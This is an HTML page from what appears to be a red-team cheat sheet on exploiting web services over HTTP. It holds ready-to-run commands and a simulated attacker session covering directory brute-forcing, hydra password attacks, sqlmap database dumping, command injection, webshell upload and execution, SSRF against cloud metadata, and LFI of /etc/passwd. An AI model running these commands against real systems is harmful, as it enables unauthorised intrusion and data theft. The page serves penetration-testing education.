<!-- Title -->
<h1 class="text-2xl font-bold mb-2">HTTP Exploitation</h1>
<p class="text-gray-300 mb-4">
  Domain: <strong>Web Security</strong> • Focus: <strong>HTTP Protocol & Web Service Exploitation</strong> • Last Updated: <strong>2025-09-05</strong>
</p>

<!-- Summary -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Summary</h2>
  <p class="text-gray-300">
    HTTP is the backbone of web communication. Attackers exploit HTTP for reconnaissance, 
    misconfiguration abuse, injection vulnerabilities, and data exfiltration. 
    Common vectors include directory brute-forcing, authentication bypass, file upload abuse, 
    Server-Side Request Forgery (SSRF), SQL injection, LFI/RFI, and webshell uploads. 
    HTTP exploitation provides initial access, privilege escalation, and data theft in Red Team ops.
  </p>
</section>

<!-- Why Exploitable -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
  <ul class="list-disc ml-5 text-gray-200 space-y-2">
    <li><strong>Misconfigured Services:</strong> Exposed directories, verbose error messages.</li>
    <li><strong>Weak Authentication:</strong> Default creds, HTTP basic auth, or session hijacking.</li>
    <li><strong>Injection Points:</strong> SQLi, XSS, Command Injection through HTTP params.</li>
    <li><strong>File Upload Abuse:</strong> Uploading PHP/ASP shells for RCE.</li>
    <li><strong>Unvalidated Redirects:</strong> SSRF, open redirect, and phishing vectors.</li>
  </ul>
</section>

<!-- How Exploitation Works -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
    <li><strong>Reconnaissance:</strong> Enumerate directories, endpoints, and technologies.</li>
    <li><strong>Authentication Testing:</strong> Check for weak/default creds, cookie tampering.</li>
    <li><strong>Injection Testing:</strong> SQLi, XSS, command injection via HTTP params.</li>
    <li><strong>File Upload Exploitation:</strong> Webshell upload and execution.</li>
    <li><strong>Post-Exploitation:</strong> Pivot via SSRF, data theft, or lateral movement.</li>
  </ol>
</section>

<!-- Steps -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Steps</h2>
  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
    <li>Scan and fingerprint HTTP service.</li>
    <li>Enumerate directories, subdomains, and parameters.</li>
    <li>Test for authentication weaknesses and default creds.</li>
    <li>Exploit injection/file upload vulnerabilities.</li>
    <li>Exfiltrate data or escalate privileges.</li>
  </ol>
</section>

<!-- Commands -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Commands</h2>
  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">

# ------------------------------
# Discovery & Recon
# ------------------------------
nmap -p 80,443 --script http* [target]           # Detect HTTP services
whatweb [target]                                 # Fingerprint web technologies
curl -I http://[target]                          # Grab HTTP headers

# ------------------------------
# Directory & File Enumeration
# ------------------------------
gobuster dir -u http://[target] -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://[target]/FUZZ -w wordlist.txt

# ------------------------------
# Authentication Testing
# ------------------------------
hydra -l admin -P rockyou.txt http-get://[target]/admin
curl -u admin:password http://[target]/protected/

# ------------------------------
# Injection Exploitation
# ------------------------------
sqlmap -u "http://[target]/page.php?id=1" --dbs
curl "http://[target]/search.php?q=<script>alert(1)</script>"
curl "http://[target]/ping.php?ip=127.0.0.1;id"

# ------------------------------
# File Upload Abuse
# ------------------------------
curl -F "file=@shell.php" http://[target]/upload.php
curl http://[target]/uploads/shell.php?cmd=whoami

# ------------------------------
# SSRF / LFI
# ------------------------------
curl "http://[target]/page.php?url=http://169.254.169.254/latest/meta-data/"
curl "http://[target]/view.php?file=../../etc/passwd"

# ------------------------------
# Example Workflow
# ------------------------------
nmap -p 80 192.168.1.100 --script http-title
gobuster dir -u http://192.168.1.100 -w wordlist.txt
sqlmap -u "http://192.168.1.100/products.php?id=10" --dump
curl -F "file=@shell.php" http://192.168.1.100/upload.php
  </pre>
</section>

<!-- Real-World Exploitation Walkthrough -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
  <details class="bg-gray-900 rounded p-3">
    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
      Click to expand attacker session
    </summary>
    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">

[ saide ~ ]$ nmap -p 80 192.168.1.100 --script http-title
PORT   STATE SERVICE
80/tcp open  http
| http-title: "Corporate Portal - Login"

[ saide ~ ]$ gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt
/admin (Status: 200)
/uploads (Status: 200)
/config (Status: 403)

[ saide ~ ]$ curl -u admin:admin http://192.168.1.100/admin
<html><title>Admin Panel</title>...</html>

[ saide ~ ]$ sqlmap -u "http://192.168.1.100/products.php?id=10" --dbs
available databases [2]:
[*] corporate_db
[*] mysql

[ saide ~ ]$ curl -F "file=@shell.php" http://192.168.1.100/upload.php
File uploaded: /uploads/shell.php

[ saide ~ ]$ curl http://192.168.1.100/uploads/shell.php?cmd=whoami
www-data

[ saide ~ ]$ curl "http://192.168.1.100/view.php?file=../../etc/passwd"
root:x:0:0:root:/root:/bin/bash
    </pre>
  </details>
</section>

<!-- Example Results -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
  <details class="bg-gray-900 rounded p-3">
    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
      Click to view sample HTTP exploitation results
    </summary>
    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">

# Directory Enumeration
/admin   → Admin panel found
/uploads → File upload directory

# Weak Credentials
Admin Panel: admin:admin

# SQL Injection Dump
Database: corporate_db
Tables:
- users
- payroll
- secrets

# File Upload RCE
http://192.168.1.100/uploads/shell.php?cmd=id
uid=33(www-data) gid=33(www-data)

# LFI
../../etc/passwd
root:x:0:0:root:/root:/bin/bash
    </pre>
  </details>
</section>

<!-- References -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
  <h2 class="text-lg font-semibold mb-2">References</h2>
  <ul class="list-disc ml-5 text-gray-200">
    <li>
      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web" 
         target="_blank" 
         class="text-blue-400 underline hover:text-blue-300">
        HackTricks – Web Pentesting
      </a>
    </li>
    <li>
      <a href="https://owasp.org/www-project-top-ten/" 
         target="_blank" 
         class="text-blue-400 underline hover:text-blue-300">
        OWASP Top 10 Web Vulnerabilities
      </a>
    </li>
    <li>Red Team workflow: Recon → Weak creds → Injection → Upload → RCE → Pivoting.</li>
  </ul>
</section>
